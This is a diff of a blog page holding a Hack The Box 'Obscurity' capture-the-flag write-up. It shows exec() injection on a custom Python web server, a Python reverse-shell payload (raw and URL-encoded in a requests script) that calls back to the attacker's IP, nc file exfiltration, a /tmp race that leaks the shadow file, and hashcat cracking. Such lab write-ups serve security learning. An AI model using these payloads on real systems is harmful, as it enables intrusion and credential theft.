@@ -6,30 +6,32 @@
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <link rel="icon" type="image/png" href="/favicon.png">
   <link rel="stylesheet" type="text/css" href="/css/style.css">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Courier+Prime:wght@700&family=Inconsolata&family=Source+Code+Pro&display=swap" rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.gstatic.com"> 
+  <link
+  href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@500&family=Kanit:wght@600&family=Roboto&family=Electrolize&display=swap&family=Fira+Mono&family=Cousine&display=swapdisplay=swap&family=IBM+Plex+Mono&display=swap&family=Courier+Prime:wght@700&display=swap"
+  rel="stylesheet"> 
+  <link rel="preconnect" href="https://fonts.gstatic.com">
   <script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
-  <!--<script src="/dist/mark.min.js" charset="UTF-8"></script>-->
-<title>Hackthebox - Obscurity Writeup &mdash; fmash16's blog</title>
+  <script src="/dist/mark.min.js" charset="UTF-8"></script>
+<title>Hackthebox - Obscurity
+Writeup &mdash; fmash16's blog</title>
 <meta property="og:title" content="Hackthebox - Obscurity Writeup" />
       <meta property="og:description" content="Difficulty  easy, topics python, fuzzing, john, crypto" />
       <meta property="og:type" content="article" />
       <meta property="og:url" content="github" />
-      <meta property="og:image" content="https://fmash16.github.io/img/htb_obscurity/card.png" />
+      <meta property="og:image" content="https://fmash16.github.io//img/htb_obscurity/card.png" />
 
 </head>
 
-<body>
-<!-- <h1 class=blogtitle>./fmash16's blog </h1> -->
-<pre style="font-family:'Courier Prime';color:var(--accent-color);text-align:center;font-weight:1000">
- ___               _   ___   ___ 
-|  _|_____ ___ ___| |_|_  | |  _|
-|  _|     | .'|_ -|   |_| |_| . |
-|_| |_|_|_|__,|___|_|_|_____|___|
-                 u/fmash16's blog</pre>
+<div class=blogtitle><a href="/index.html">fmash16's blog</a></div> 
+<!--<pre style="font-family:'Courier Prime';color:var(--accent-color);text-align:center;font-weight:1000">-->
+ <!--___               _   ___   ___ -->
+<!--|  _|_____ ___ ___| |_|_  | |  _|-->
+<!--|  _|     | .'|_ -|   |_| |_| . |-->
+<!--|_| |_|_|_|__,|___|_|_|_____|___|-->
+                 <!--./fmash16's blog</pre>-->
 <nav>
-   <a href="/index.html">home</a>
+   <!--<a href="/index.html">home</a>-->
    <a href="/archive.html">archive</a>
    <a href="mailto:fmash16@gmail.com">mail</a>
    <a href="https://github.com/fmash16">github</a>
@@ -39,60 +41,80 @@
 </nav>
 
 <article>
-<input id="toggle" type="checkbox" checked>
-<label for="toggle">TOC</label>
-<nav class='toc'>
-    <ul>
-    <li><a href="#hackthebox---obscurity-writeup">Hackthebox - Obscurity Writeup</a></li>
-    <li><a href="#initial-foothold">Initial Foothold</a>
-    <ul>
-    <li><a href="#nmap-scan">Nmap scan:</a></li>
-    <li><a href="#website-at-port-8080">Website at port 8080:</a></li>
-    <li><a href="#fuzzing-the-site-to-find-the-server-source-code-using-wfuzz">Fuzzing the site to find the server source code using wfuzz:</a></li>
-    <li><a href="#analyze-the-custom-server-source-file">Analyze the custom server source file:</a></li>
-    <li><a href="#privilege-escalation---user">Privilege escalation - User:</a></li>
-    <li><a href="#privilege-escalation---root">Privilege escalation - Root:</a></li>
-    </ul></li>
-    </ul>
-</nav>
-<h1 id="hackthebox---obscurity-writeup">Hackthebox - Obscurity Writeup</h1>
+<ul>
+<li><a href="#hackthebox---obscurity-writeup">Hackthebox - Obscurity
+Writeup</a></li>
+<li><a href="#initial-foothold">Initial Foothold</a>
+<ul>
+<li><a href="#nmap-scan">Nmap scan:</a></li>
+<li><a href="#website-at-port-8080">Website at port 8080:</a></li>
+<li><a
+href="#fuzzing-the-site-to-find-the-server-source-code-using-wfuzz">Fuzzing
+the site to find the server source code using wfuzz:</a></li>
+<li><a href="#analyze-the-custom-server-source-file">Analyze the custom
+server source file:</a></li>
+<li><a href="#privilege-escalation---user">Privilege escalation -
+User:</a></li>
+<li><a href="#privilege-escalation---root">Privilege escalation -
+Root:</a></li>
+</ul></li>
+</ul>
+<h1 id="hackthebox---obscurity-writeup">Hackthebox - Obscurity
+Writeup</h1>
 <p><img src="/img/htb_obscurity/card.png" /></p>
 <h1 id="initial-foothold">Initial Foothold</h1>
 <h2 id="nmap-scan">Nmap scan:</h2>
 <pre><code># nmap -sC -sV -sS -oA nmap.out 10.10.10.168</code></pre>
-<p>Intersting open ports: * 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) * 80/tcp closed http * 8080/tcp open http-proxy BadHTTPServer * 9000 unknown(nc does not show any banner)</p>
+<p>Intersting open ports: * 22/tcp open ssh OpenSSH 7.6p1 Ubuntu
+4ubuntu0.3 (Ubuntu Linux; protocol 2.0) * 80/tcp closed http * 8080/tcp
+open http-proxy BadHTTPServer * 9000 unknown(nc does not show any
+banner)</p>
 <h2 id="website-at-port-8080">Website at port 8080:</h2>
 <ul>
 <li>Looks like the server runs custom software for security</li>
 </ul>
 <p><img src="/img/htb_obscurity/1.png" /></p>
 <ul>
-<li>We have some contact information. We see that the box domain is <strong>obscure.htb</strong></li>
+<li>We have some contact information. We see that the box domain is
+<strong>obscure.htb</strong></li>
 </ul>
 <p><img src="/img/htb_obscurity/2.png" /></p>
 <ul>
-<li>Source code for the web server is in <strong>‘SuperSecureServer.py’</strong> in the secret development directory</li>
+<li>Source code for the web server is in
+<strong>‘SuperSecureServer.py’</strong> in the secret development
+directory</li>
 </ul>
 <p><img src="/img/htb_obscurity/3.png" /></p>
-<h2 id="fuzzing-the-site-to-find-the-server-source-code-using-wfuzz">Fuzzing the site to find the server source code using wfuzz:</h2>
+<h2
+id="fuzzing-the-site-to-find-the-server-source-code-using-wfuzz">Fuzzing
+the site to find the server source code using wfuzz:</h2>
 <pre><code>wfuzz -w /usr/share/wordlists/wfuzz/general/common.txt --hc 401,402,403,404 http://10.10.10.168:8080/FUZZ/SuperSecureServer.py</code></pre>
 <p>Output:</p>
 <p><img src="/img/htb_obscurity/4.png" /></p>
-<p>We find the file under a directory called <strong>“develop”</strong></p>
-<h2 id="analyze-the-custom-server-source-file">Analyze the custom server source file:</h2>
+<p>We find the file under a directory called
+<strong>“develop”</strong></p>
+<h2 id="analyze-the-custom-server-source-file">Analyze the custom server
+source file:</h2>
 <p>We get the file using wget:</p>
 <pre><code>wget http://10.10.10.168:8080/develop/SuperSecureServer.py</code></pre>
-<p>In the source, we find an interesting function <strong>servedoc</strong>:</p>
+<p>In the source, we find an interesting function
+<strong>servedoc</strong>:</p>
 <p><img src="/img/htb_obscurity/5.png" /></p>
 <p>What intersets us are the following:</p>
 <pre><code>path = urllib.parse.unquote(path)
 info = &quot;output = &#39;Document: {}&#39;&quot;
 exec(info.format(path))</code></pre>
-<p>We insert the following payload in the path of our request to the server to get a reverse shell:</p>
+<p>We insert the following payload in the path of our request to the
+server to get a reverse shell:</p>
 <pre><code>/&#39;;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.15.184&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre>
-<p>So our web url with payload stands as: http://10.10.10.168:8080/‘;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.15.184”,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,“-i”]);’</p>
+<p>So our web url with payload stands as:
+http://10.10.10.168:8080/‘;import
+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.15.184”,1337));os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,“-i”]);’</p>
 <p>We can write a python script that performs the request for us:</p>
-<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> requests</span>
+<div class="sourceCode" id="cb6"><pre
+class="sourceCode python"><code class="sourceCode python"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> requests</span>
 <span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> os</span>
 <span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a></span>
@@ -101,20 +123,28 @@ exec(info.format(path))</code></pre>
 <span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">&quot;</span><span class="sc">%27%</span><span class="st">0Aimport</span><span class="sc">%20s</span><span class="st">ocket%2Csubprocess%2Cos%0As%3Dsocket.socket</span><span class="sc">%28s</span><span class="st">ocket.AF_INET%2Csocket.SOCK_STREAM</span><span class="sc">%29%</span><span class="st">0As.connect</span><span class="sc">%28%</span><span class="st">28%2210.10.14.234</span><span class="sc">%22%</span><span class="st">2C1234</span><span class="sc">%29%</span><span class="st">29%0Aos.dup2</span><span class="sc">%28s</span><span class="st">.fileno</span><span class="sc">%28%</span><span class="st">29%2C0</span><span class="sc">%29%</span><span class="st">0Aos.dup2</span><span class="sc">%28s</span><span class="st">.fileno</span><span class="sc">%28%</span><span class="st">29%2C1</span><span class="sc">%29%</span><span class="st">0Aos.dup2</span><span class="sc">%28s</span><span class="st">.fileno</span><span class="sc">%28%</span><span class="st">29%2C2</span><span class="sc">%29%</span><span class="st">0Ap%3Dsubprocess.call</span><span class="sc">%28%</span><span class="st">5B%22/bin/bash</span><span class="sc">%22%</span><span class="st">2C%22-i</span><span class="sc">%22%</span><span class="st">5D</span><span class="sc">%29%</span><span class="st">0A%27&quot;</span></span>
 <span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a>requests.get(host<span class="op">+</span>payload)</span></code></pre></div>
-<p>We open a nc listener on port 1337 on our kali and enter the request to get a reverse shell</p>
+<p>We open a nc listener on port 1337 on our kali and enter the request
+to get a reverse shell</p>
 <p><img src="/img/htb_obscurity/6.png" /></p>
 <p>We upgrade our shell to a fully interactive one:</p>
 <p><img src="/img/htb_obscurity/7.png" /></p>
 <h2 id="privilege-escalation---user">Privilege escalation - User:</h2>
-<p>We find a user named <strong>robert</strong> in the home directory and find the following files:</p>
+<p>We find a user named <strong>robert</strong> in the home directory
+and find the following files:</p>
 <p><img src="/img/htb_obscurity/8.png" /></p>
-<p>The following files interests us: * check.txt * out.txt * passwordreminder.txt * SuperSecureCrypt.py * BetterSSH</p>
-<p>We transfer the files to our local machine using nc: On target: nc 10.10.15.184 8888 &lt; SuperSecureCrypt.py On host: nc -lnvp 8888 &gt; SuperSecureCrypt.py</p>
+<p>The following files interests us: * check.txt * out.txt *
+passwordreminder.txt * SuperSecureCrypt.py * BetterSSH</p>
+<p>We transfer the files to our local machine using nc: On target: nc
+10.10.15.184 8888 &lt; SuperSecureCrypt.py On host: nc -lnvp 8888 &gt;
+SuperSecureCrypt.py</p>
 <p>So, we have a custom Crypt here. The contents of the files are:</p>
 <p><img src="/img/htb_obscurity/9.png" /></p>
-<p>So, we have to find out the key of the user robert by briyteforcing and then use the key to decrypt the passwordreminder.txt using the script SuperSecureCrypt.py</p>
+<p>So, we have to find out the key of the user robert by briyteforcing
+and then use the key to decrypt the passwordreminder.txt using the
+script SuperSecureCrypt.py</p>
 <p>We write a decryptor in python</p>
-<div class="sourceCode" id="cb7"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="co">#! /usr/bin/env python3</span></span>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode python"><code class="sourceCode python"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="co">#! /usr/bin/env python3</span></span>
 <span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="co"># -*- coding: utf-8 -*-</span></span>
 <span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> __future__ <span class="im">import</span> print_function</span>
@@ -153,28 +183,45 @@ exec(info.format(path))</code></pre>
 <span id="cb7-37"><a href="#cb7-37" aria-hidden="true" tabindex="-1"></a>                    <span class="cf">break</span></span>
 <span id="cb7-38"><a href="#cb7-38" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb7-39"><a href="#cb7-39" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(key)</span></code></pre></div>
-<p>Running the script, we find the key: <strong>alexandrovich</strong></p>
+<p>Running the script, we find the key:
+<strong>alexandrovich</strong></p>
 <p>Now we decrypt the passwordremider.txt:</p>
 <p><img src="/img/htb_obscurity/10.png" /></p>
-<p>We found our password for the user. We can use these creds to login using ssh as the user robert and read out user.txt file</p>
+<p>We found our password for the user. We can use these creds to login
+using ssh as the user robert and read out user.txt file</p>
 <p><img src="/img/htb_obscurity/11.png" /></p>
 <h2 id="privilege-escalation---root">Privilege escalation - Root:</h2>
 <p>Running command <code>sudo -l</code>, we find following:</p>
 <p><img src="/img/htb_obscurity/12.png" /></p>
-<p>So, we can run the command <code>/usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</code> as root</p>
+<p>So, we can run the command
+<code>/usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</code> as
+root</p>
 <p>We have a look at the script BetterSSH.py</p>
 <p><img src="/img/htb_obscurity/13.png" /></p>
-<p>We see here that during the login process using the script, it temporarily writes the shadow file into the tmp/SSH file. So we can read the shadow file from the tmp/SSH folder while the ssh login is running. The file is written after taking the password input. But as we run the script, we see that as soon as we enter the password, we get an invalind user error. So, we have a race condition here. What we do is run a while loop in the background that continuosly copies all files in the /tmp/SSH folder into a folder of our own e.g. /tmp/fm. Then if we run our ssh script, the shadow file will get copied into the /tmp/SSH folder and so to our own created dir.</p>
+<p>We see here that during the login process using the script, it
+temporarily writes the shadow file into the tmp/SSH file. So we can read
+the shadow file from the tmp/SSH folder while the ssh login is running.
+The file is written after taking the password input. But as we run the
+script, we see that as soon as we enter the password, we get an invalind
+user error. So, we have a race condition here. What we do is run a while
+loop in the background that continuosly copies all files in the /tmp/SSH
+folder into a folder of our own e.g. /tmp/fm. Then if we run our ssh
+script, the shadow file will get copied into the /tmp/SSH folder and so
+to our own created dir.</p>
 <p><img src="/img/htb_obscurity/14.png" /></p>
-<p>We see a new file in our created directory. We check the contents of the file and get the password hashes.</p>
+<p>We see a new file in our created directory. We check the contents of
+the file and get the password hashes.</p>
 <p><img src="/img/htb_obscurity/15.png" /></p>
-<p>We see that the hash is an crypt hash.We check the type of the hash using hashcat. SInce it has got $6, this should be sha512crypt.</p>
+<p>We see that the hash is an crypt hash.We check the type of the hash
+using hashcat. SInce it has got $6, this should be sha512crypt.</p>
 <p><img src="/img/htb_obscurity/16.png" /></p>
 <p>So now we decrypt the hash with:</p>
 <pre><code>hashcat -m 1800 -o root_pass root_hash /usr/share/wordlists/rockyou.txt</code></pre>
-<p>And after waiting some time, we get our required root pass in the root_pass file:</p>
+<p>And after waiting some time, we get our required root pass in the
+root_pass file:</p>
 <p><img src="/img/htb_obscurity/17.png" /></p>
-<p>We use the password to login as root using su and get our root.txt file</p>
+<p>We use the password to login as root using su and get our root.txt
+file</p>
 <p><img src="/img/htb_obscurity/18.png" /></p>
 </article>
 
